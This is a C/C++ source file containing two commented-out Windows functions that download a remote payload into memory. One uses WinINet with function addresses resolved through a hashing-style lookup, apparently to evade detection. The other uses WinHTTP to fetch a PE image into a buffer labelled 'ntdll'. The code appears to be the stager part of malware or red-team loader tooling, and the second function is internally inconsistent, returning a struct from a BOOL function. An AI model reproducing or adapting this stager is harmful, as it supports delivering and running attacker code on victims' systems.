#include <Windows.h>

/*
BOOL Wininet(LPCSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
	HMODULE hWnet = LoadLibraryW(L"wininet.dll");

	typedef HINTERNET(WINAPI* dInternetOpenA)(IN LPCSTR lpszAgent, IN DWORD  dwAccessType, IN LPCSTR lpszProxy, IN LPCSTR lpszProxyBypass, IN DWORD  dwFlags);
	typedef HINTERNET(WINAPI* dInternetOpenUrlA)(IN HINTERNET hInternet, IN LPCSTR lpszUrl, IN LPCSTR lpszHeaders, IN DWORD dwHeadersLength, IN DWORD dwFlags, IN DWORD_PTR dwContext);
	typedef BOOL(WINAPI* dInternetReadFile)(IN HINTERNET hFile, IN LPVOID lpBuffer, IN DWORD dwNumberOfBytesToRead, IN LPDWORD lpdwNumberOfBytesRead);
	typedef BOOL(WINAPI* dInternetSetOptionA)(IN HINTERNET hInternet, IN DWORD dwOption, IN LPVOID lpBuffer, IN DWORD dwBufferLength);
	typedef BOOL(WINAPI* dInternetCloseHandle)(IN HINTERNET hInternet);

	dInternetOpenA pInternetOpenA = (dInternetOpenA)GetProcAddressH(hWnet, "InternetOpenA");
	dInternetOpenUrlA pInternetOpenUrlA = (dInternetOpenUrlA)GetProcAddressH(hWnet, "InternetOpenUrlA");
	dInternetReadFile pInternetReadFile = (dInternetReadFile)GetProcAddressH(hWnet, "InternetReadFile");
	dInternetSetOptionA pInternetSetOptionA = (dInternetSetOptionA)GetProcAddressH(hWnet, "InternetSetOptionA");
	dInternetCloseHandle pInternetCloseHandle = (dInternetCloseHandle)GetProcAddressH(hWnet, "InternetCloseHandle");

	BOOL		bSTATE = TRUE;

	HINTERNET	hInternet = NULL,
		hInternetFile = NULL;

	DWORD		dwBytesRead = NULL;

	SIZE_T	   	 sSize = NULL;
	PBYTE		pBytes = NULL,
		pTmpBytes = NULL;


	hInternet = pInternetOpenA(NULL, NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		PRINTA("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}


	hInternetFile = pInternetOpenUrlA(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
		PRINTA("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

	while (TRUE) {

		if (!pInternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			PRINTA("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
			bSTATE = FALSE; goto _EndOfFunction;
		}

		sSize += dwBytesRead;

		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			bSTATE = FALSE; goto _EndOfFunction;
		}

		CopyMemoryex((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
		memset(pTmpBytes, '\0', dwBytesRead);

		if (dwBytesRead < 1024) {
			break;
		}
	}

	*pPayloadBytes = pBytes;
	*sPayloadSize = sSize;

_EndOfFunction:
	if (hInternet)
		pInternetCloseHandle(hInternet);
	if (hInternetFile)
		pInternetCloseHandle(hInternetFile);
	if (hInternet)
		pInternetSetOptionA(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	if (pTmpBytes)
		LocalFree(pTmpBytes);
	return bSTATE;
}
*/

/*
BOOL Winhttp(wchar_t* whost, DWORD port, wchar_t* wresource) {
    struct DLL dll;
    std::vector<unsigned char> PEbuf;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer = NULL;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;
    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"WinHTTP Example/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);


    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, whost,
            port, 0);
    else
        printf("Failed in WinHttpConnect (%u)\n", GetLastError());

    // Create an HTTP request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", wresource,
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            NULL);
    else
        printf("Failed in WinHttpOpenRequest (%u)\n", GetLastError());

    // Send a request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0, WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);
    else
        printf("Failed in WinHttpSendRequest (%u)\n", GetLastError());

    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    else printf("Failed in WinHttpReceiveResponse (%u)\n", GetLastError());

    // Keep checking for data until there is nothing left.
    if (bResults)
        do
        {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
                printf("Error %u in WinHttpQueryDataAvailable (%u)\n", GetLastError());

            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the Data.
                ZeroMemory(pszOutBuffer, dwSize + 1);

                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                    dwSize, &dwDownloaded))
                    printf("Error %u in WinHttpReadData.\n", GetLastError());
                else {


                    PEbuf.insert(PEbuf.end(), pszOutBuffer, pszOutBuffer + dwDownloaded);
                     
                    

                }
                delete[] pszOutBuffer;

            }

        } while (dwSize > 0);

        if (PEbuf.empty() == TRUE)
        {
            printf("Failed in retrieving the PE");
        }

        // Report any errors.
        if (!bResults)
            printf("Error %d has occurred.\n", GetLastError());

        // Close any open handles.
        if (hRequest) WinHttpCloseHandle(hRequest);
        if (hConnect) WinHttpCloseHandle(hConnect);
        if (hSession) WinHttpCloseHandle(hSession);

        size_t size = PEbuf.size();
        //printf("size : %d\n", size);
        char* ntdll = (char*)malloc(size);
        for (int i = 0; i < PEbuf.size(); i++) {
            ntdll[i] = PEbuf[i];
        }
        dll.ntdll = ntdll;
        dll.size = size;
        return dll;
}
*/
